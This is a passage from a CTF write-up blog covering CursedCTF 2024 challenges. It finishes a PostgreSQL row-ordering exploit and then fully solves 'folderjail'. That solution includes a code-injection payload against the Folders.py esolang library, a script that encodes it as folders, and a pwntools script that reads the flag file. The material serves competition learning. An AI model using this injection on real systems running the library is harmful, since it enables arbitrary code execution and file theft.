writable. When PostgreSQL then searches for the first place it can write into, it will not be the end of the table, it will be the first of the empty writable rows.</p><p>This would mean that, after updating the last value (Which conserves the order of the stages so we can update another value in the future), it will create an empty row, and if we can somehow trigger a vacuum to the table, the next time we update a value it will be placed before the last stage. This is exactly what we want.</p><p>So, how exactly do we trigger this vacuum? PostgreSQL by default will automatically run this vacuum after 50 rows are “empty” in the table after 1 minute. So if we update the last value 50 times and then update stage 2, we will get the order of <code class="language-plaintext highlighter-rouge">1, 2, 3, 4, 5, 2, 6</code>. So let’s see the steps to exploit this.</p><ol><li>Create a hero with stage IDs of <code class="language-plaintext highlighter-rouge">1, 2, 2, 3, 4, 5, 6</code><li>Update the description of the last stage 50 times.<li>Wait a minute or two for safe measure.<li>Update the description of stage 2.<li>Go to /flag<li>Profit</ol><p>After we do this, we see the following page: <img data-src="/images/cursedctf/D.png" alt="" data-proofer-ignore></p><h1 id="misc---folderjail">Misc - folderjail</h1><h2 id="challenge-description-1"><span class="mr-2">Challenge description:</span><a href="#challenge-description-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>look at this amazing esolang i found from hackthebox cyber apolcogzlyaeze. nc chals.4.cursedc.tf 32001</p><h2 id="challenge-code"><span class="mr-2">Challenge code:</span><a href="#challenge-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">tarfile</span>
<span class="kn">from</span> <span class="nn">folders.folders</span> <span class="kn">import</span> <span class="n">FolderAnalyzer</span><span class="p">,</span> <span class="n">FolderTranspiler</span>

<span class="n">TMP_DIR</span> <span class="o">=</span> <span class="s">'/tmp/program'</span>
<span class="k">def</span> <span class="nf">unzip_tar_gz</span><span class="p">(</span><span class="n">hex_input</span><span class="p">):</span>
    <span class="n">tar_gz_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_input</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">TMP_DIR</span><span class="p">):</span>
        <span class="n">shutil</span><span class="p">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">TMP_DIR</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">TMP_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">TMP_DIR</span> <span class="o">+</span> <span class="s">'/archive.tar.gz'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">tar_gz_data</span><span class="p">)</span>

    <span class="k">with</span> <span class="n">tarfile</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">TMP_DIR</span> <span class="o">+</span> <span class="s">'/archive.tar.gz'</span><span class="p">,</span> <span class="s">'r:gz'</span><span class="p">,</span> <span class="n">dereference</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="k">as</span> <span class="n">tar</span><span class="p">:</span>
        <span class="n">tar</span><span class="p">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">TMP_DIR</span><span class="p">)</span>

    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">TMP_DIR</span> <span class="o">+</span> <span class="s">'/archive.tar.gz'</span><span class="p">)</span>

<span class="n">hex_input</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">unzip_tar_gz</span><span class="p">(</span><span class="n">hex_input</span><span class="p">)</span>

<span class="n">tokens</span> <span class="o">=</span> <span class="n">FolderAnalyzer</span><span class="p">(</span><span class="n">TMP_DIR</span><span class="p">).</span><span class="n">lex</span><span class="p">()</span>
<span class="n">code</span> <span class="o">=</span> <span class="n">FolderTranspiler</span><span class="p">(</span><span class="n">tokens</span><span class="p">).</span><span class="n">transpile</span><span class="p">()</span>

<span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</pre></table></code></div></div><p>This challenge uses the esolang <a href="http://esolangs.org/wiki/Folders">Folders</a> in which your program is encoded in the directory structure of folders rather than in actual files. We can submit our directory program to the challenge server in a tar.gz file and it then gets interpeted by the <a href="https://github.com/SinaKhalili/Folders.py">Folders.py</a> python library. Writing a program in the Folders language however isn’t enough for us to be able to read flag.txt from the challenge server as the Folders language only supports some basic functions. Instead we can exploit the python library as it has code injection. When we encode a string for example in Folders this library that converts it to Python doesn’t sanitize double quotes so we can simply include those in our string literal and provide whatever Python code we want after that.</p><p>We made this program to generate a folder tree that represent a string literal:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>

<span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'");print(open("/app/flag.txt").read());print("'</span>

<span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s">"gen/"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">h</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>

    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex1"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex2"</span><span class="p">)</span>

    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">))[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">"0"</span><span class="p">),</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">))[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
        <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex1/</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex1/</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">/1"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
        <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex2/</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="sa">f</span><span class="s">"gen/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/hex2/</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">/1"</span><span class="p">)</span>
</pre></table></code></div></div><p>Then we took the HelloWorld example from the Python library github and replaced the contents of “New Folder/New folder (2)/New Folder (3)” with the folders we generated.</p><p>Create the tar file with <code class="language-plaintext highlighter-rouge">tar -czf payload.tar.gz .</code></p><p>Finally we submit the tar file to the server with this script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">read_file_as_hex</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error: File '</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s">' not found."</span><span class="p">)</span>

<span class="n">file_path</span> <span class="o">=</span> <span class="s">"lol.tar.gz"</span>
<span class="nb">hex</span> <span class="o">=</span> <span class="n">read_file_as_hex</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals.4.cursedc.tf'</span><span class="p">,</span><span class="mi">32001</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;'</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Initially I tried sending with netcat but that complained about unexpected EOF at 4096 which is some kind of terminal limitation.</p><p>Running the script:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python lol.py
<span class="o">[</span>+] Opening connection to chals.4.cursedc.tf on port 32001: Done
/home/chieftan/ctf/cursedctf24/folderjail/lol.py:20: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.send<span class="o">(</span>hex<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
 <span class="err">$</span>
<span class="err">$</span>

cursed<span class="o">{</span>i_4ctually_H8_h4ck_th3_BOX<span class="o">}</span>

No, seriously, this isn<span class="s1">'t a joke. Hack the Box kidnapped my family. They stole my Crocs. I hate them.

Because of Hack the Box, my bike brake broke and I almost died. Because of Hack the Box, I was banned from my favorite pub. Because of Hack the Box, Elon Musk banned me from Xitter.

Thank you Hack the Box for giving me a $15 Giftcard. I will be sure to use this gift card to purchase a shirt that is not overpriced in any way.

Hack The Box is a Great Place to Study Cybersecurity and Learn about offensive Hacking and cyberfsecurity of the securting cyber cybe fcy e rbc yebrf shas theo ahck the box hjajklfndsob tose hosd thuos pdohbvsodufhbnsdop;fbhno
[*] Got EOF while reading in interactive
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web/'>web</a>, <a href='/categories/misc/'>misc</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/misc/" class="post-tag no-text-decoration" >misc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CursedCTF 2024 - Ireland.RE&amp;url=https://ireland.re/posts/CursedCTF_2024/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CursedCTF 2024 - Ireland.RE&amp;u=https://ireland.re/posts/CursedCTF_2024/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/CursedCTF_2024/&amp;text=CursedCTF 2024 - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Backdoor_CTF_2023_Web/"><div class="card-body"> <em class="timeago small" data-ts="1702857600" > 2023-12-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor CTF 2023 Web Challenges</h3><div class="text-muted small"><p> web/too-many-admins Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql). I immediately noticed the SQL injection h...</p></div></div></a></div><div class="card"> <a href="/posts/NiteCTF_2023/"><div class="card-body"> <em class="timeago small" data-ts="1702944000" > 2023-12-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NiteCTF 2023 Challenges</h3><div class="text-muted small"><p> Writeups These are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web. web/Mini Survey Downloading the source, we see this is a Javascript challenge immediately observin...</p></div></div></a></div><div class="card"> <a href="/posts/UofTCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1705449600" > 2024-01-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UofTCTF 2024 Challenge Writeups</h3><div class="text-muted small"><p> Writeups web/Voice Changer Sourceless web challenge. Just a file upload with a pitch option. I intercepted the HTTP request and modified the pitch value. POST /upload HTTP/1.1 ------WebKitFormB...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/KalmarCTF_2024/" class="btn btn-outline-primary" prompt="Older"><p>KalmarCTF 2024 Web Challenges</p></a> <a href="/posts/UMassCTF2024/" class="btn btn-outline-primary" prompt="Newer"><p>UMassCTF 2024</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
